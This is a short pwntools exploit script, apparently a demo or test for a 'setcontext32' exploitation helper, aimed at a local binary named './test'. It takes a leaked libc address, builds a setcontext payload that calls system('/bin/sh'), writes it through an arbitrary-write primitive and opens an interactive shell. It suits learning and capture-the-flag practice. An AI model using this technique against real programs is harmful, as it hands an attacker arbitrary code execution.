from typing import cast
from pwn import *

from setcontext32 import setcontext32

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-v"]

p = process(["./test"])

libc.address = int(p.recvline().decode().strip(), 16) - 0x50D70
log.success(f"{libc.address = :#x}")

system = cast(int, libc.sym["system"])
binsh = cast(int, next(libc.search(b"/bin/sh")))
dest, payload = setcontext32(libc, regs={"rip": system, "rdi": binsh})

log.info(f"{dest = :#x}")

for i in range(0, len(payload), 8):
    value = payload[i : i + 8].ljust(8, b"\0")
    p.send(b"w")
    p.send(p64(dest + i))
    p.send(value)

p.interactive()
